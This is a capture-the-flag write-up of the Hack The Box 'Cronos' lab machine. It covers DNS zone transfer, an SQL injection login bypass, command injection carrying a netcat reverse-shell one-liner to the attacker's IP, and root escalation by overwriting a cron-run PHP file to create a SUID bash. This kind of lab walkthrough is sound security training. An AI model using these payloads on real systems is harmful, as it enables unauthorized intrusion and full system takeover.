---
title: Hack The Box - Cronos (Without Metasploit)
date: 2021-01-13 16:59:00 +0800
categories: [hackthebox]
tags: [linux, laravel, sqli]
image:
    path: /assets/images/cronos.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.13 cronos.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.

```bash 
$ which resolve 
resolve () {
        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
}

$ which superscan
superscan () {
        name="$(resolve $1)" 
        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
}

$ superscan cronos.htb
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.13:22
Open 10.10.10.13:53
Open 10.10.10.13:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-13 03:07 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:07
Completed Parallel DNS resolution of 1 host. at 03:07, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 03:07
Scanning 10.10.10.13 [3 ports]
Discovered open port 22/tcp on 10.10.10.13
Discovered open port 80/tcp on 10.10.10.13
Discovered open port 53/tcp on 10.10.10.13
Completed Connect Scan at 03:07, 0.01s elapsed (3 total ports)
Initiating Service scan at 03:07
Scanning 3 services on 10.10.10.13
Completed Service scan at 03:07, 6.02s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.13.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 8.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
Nmap scan report for 10.10.10.13
Host is up, received user-set (0.0062s latency).
Scanned at 2021-01-13 03:07:23 UTC for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:07
Completed NSE at 03:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

# Enumeration (1)

## Port 53 `ISC BIND 9.10.3-P4 (Ubuntu Linux)`

```bash
$ host -t axfr cronos.htb cronos.htb 
Trying "cronos.htb"
Using domain server:
Name: cronos.htb
Address: 10.10.10.13#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35300
;; flags: qr aa ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;cronos.htb.                    IN      AXFR

;; ANSWER SECTION:
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800

Received 192 bytes from 10.10.10.13#53 in 3 ms
```

We are able to perform a zone transfer for the `cronos.htb` domain and it has returned to 3 different names `www.cronos.htb, ns1.cronos.htb and admin.cronos.htb`. Lets add them to our `/etc/hosts.

```bash
$ cat /etc/hosts
...
10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb
```

## Port 80 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/cronos1.png)

When we visit `cronos.htb`, we see 5 different buttons that brings us to websites related `Laravel`, a `PHP` web framework. However, when we visit `admin.cronos.htb`, we see a login page!

![](/assets/images/cronos2.png)

Trying out common credentials such as `admin:admin` and `admin:password` didn't work so lets try some basic `SQL` injection by putting `' or 1=1;--` as the username and `password` as the password.

![](/assets/images/cronos3.png)

Invalid username... But if we append an additional space to our username such that it will become `' or 1=1;-- `, we will be able to bypass the login page without knowing the credentials!

![](/assets/images/cronos4.png)

This page allows us to specify an IP address and it will perform `traceroute` on it and return the output. You could also choose to `ping` as well. 

# Exploitation (1)

However, our input is not being validated so lets try injecting some commands.

![](/assets/images/cronos5.png)

We are able to inject a `whoami` command and it returns `www-data`! Now lets use it to establish a reverse shell connection. So first we will setup our listener.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

By putting `; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XX.XX 1337 >/tmp/f` and pressing `Execute!`, we will receive a connection as `www-data`.

```bash
$ rlwrap nc -lvnp 1337                          
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.13] 40626
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@cronos:/var/www/admin$  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# user.txt

The user flag is stored in the home directory of `noulis`.

```bash
www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
51d2XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

If we check `/etc/crontab`, we see that there is one listed task which runs as `root`!

```bash
www-data@cronos:/var/www/admin$ cat /etc/crontab
...
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

The file `/var/www/laravel/artisan` is executed by `root` using `php` at every minute. If we check the permissions of that file, we see that we own it and we can modify it!

```bash
www-data@cronos:/var/www/admin$ ls -al /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

# Exploitation (2)

Instead of modifying `artisan` to establish another reverse shell, we just make a `SUID` copy of `/bin/bash`. 

```bash
www-data@cronos:/var/www/admin$ echo '<?php passthru("cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod +s /tmp/rootbash") ?>' > /var/www/laravel/artisan
```

After a while, we should see a `rootbash` in `/tmp` with the `SUID` bit set.

```bash
www-data@cronos:/var/www/admin$ ls -al /tmp/rootbash
-rwsr-sr-x 1 root root 1037528 Jan 13 10:48 /tmp/rootbash
```

Now we can spawn a shell as `root` by running `/tmp/rootbash -p`

```bash
www-data@cronos:/var/www/admin$ /tmp/rootbash -p
rootbash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

# root.txt

The root flag is in the home directory of `root`, as usual.

```bash
rootbash-4.3# cat /root/root.txt
1703XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !